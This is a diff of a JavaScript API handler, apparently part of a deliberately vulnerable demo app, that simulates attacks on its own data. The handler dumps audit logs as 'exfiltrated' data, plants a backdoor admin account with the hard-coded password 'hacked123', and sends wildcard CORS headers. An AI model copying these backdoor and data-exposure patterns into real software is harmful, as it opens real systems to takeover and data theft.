@@ -1,10 +1,23 @@
 import { getUsers, saveUsers, addLogEntry, getSessions, getAuditLog } from '../lib/db.js';
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).end();
+  // Enable CORS
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+  
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
   
   const { action, target } = req.body;
   const ip = req.headers['x-forwarded-for'] || 'unknown';
+  
+  console.log(`[ATTACK] ${action} attack triggered from ${ip}`);
   
   await addLogEntry('MALWARE_TRIGGERED', { action, target, ip, timestamp: new Date().toISOString() }, req);
   
@@ -84,7 +97,7 @@ export default async function handler(req, res) {
     results.dataExfiltrated.push({
       type: 'AUDIT_LOG',
       entries: auditLog.length,
-      logs: auditLog.slice(-20) // Last 20 entries
+      logs: auditLog.slice(-20)
     });
     results.actions.push(`✅ Audit Log Access: ${auditLog.length} log entries exposed`);
     results.vulnerabilitiesExploited.push('No authentication on /api/audit endpoint');
@@ -100,8 +113,7 @@ export default async function handler(req, res) {
       password: 'hacked123',
       email: 'attacker@malicious.com',
       role: 'admin',
-      salary: 999999,
-      ssn: '000-00-0000'
+      salary: 999999
     };
     
     users.push(backdoorUser);
@@ -113,13 +125,13 @@ export default async function handler(req, res) {
       password: backdoorUser.password
     });
     results.actions.push(`✅ Backdoor Account Created: ${backdoorUser.username} / hacked123`);
-    results.vulnerabilitiesExploited.push('No input validation on registration - account created without email verification');
+    results.vulnerabilitiesExploited.push('No input validation on registration');
     await addLogEntry('BACKDOOR_CREATED', { username: backdoorUser.username }, req);
   }
   
   // Exploit 6: Buffer overflow simulation
   if (action === 'buffer_overflow' || action === 'full_attack') {
-    const overflowPayload = 'A'.repeat(10000) + '\\x90'.repeat(1000) + 'MALICIOUS_SHELLCODE';
+    const overflowPayload = 'A'.repeat(10000);
     results.dataExfiltrated.push({
       type: 'BUFFER_OVERFLOW_PAYLOAD',
       size: overflowPayload.length,
@@ -130,7 +142,6 @@ export default async function handler(req, res) {
     await addLogEntry('BUFFER_OVERFLOW_EXPLOIT', { payload_size: overflowPayload.length }, req);
   }
   
-  // Generate attack summary
   const attackSummary = {
     attack_id: Date.now(),
     timestamp: new Date().toISOString(),
